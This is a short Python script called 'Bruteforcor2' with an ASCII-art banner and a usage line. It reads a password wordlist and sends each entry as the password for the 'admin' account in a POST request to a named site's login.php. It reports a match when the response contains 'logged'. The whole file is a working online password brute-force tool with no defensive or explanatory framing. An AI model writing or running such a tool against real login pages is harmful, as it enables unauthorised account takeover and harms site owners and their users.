import requests
import sys

with open(sys.argv[1],"r") as f:
    pwd = f.read()
pwd = pwd.replace("\r","")
pwd = pwd.split("\n")

head = """   ___           __      ___                             ___   ___ 
  / _ )______ __/ /____ / _/__  ___________  ____  _  __|_  | / _ \ 
 / _  / __/ // / __/ -_) _/ _ \/ __/ __/ _ \/ __/ | |/ / __/_/ // /
/____/_/  \_,_/\__/\__/_/ \___/_/  \__/\___/_/    |___/____(_)___/ 

use: python Bruteforcor2.py wordlist.txt

"""

print(head)

for elt in pwd:
    dico = {
        "user":"admin",
        "password":elt
    }
    r = requests.post("https://claquesoune.com/login.php",data=dico)
    if "logged" in r.text:
        print("Admin password found !, pass="+elt)
    print(".")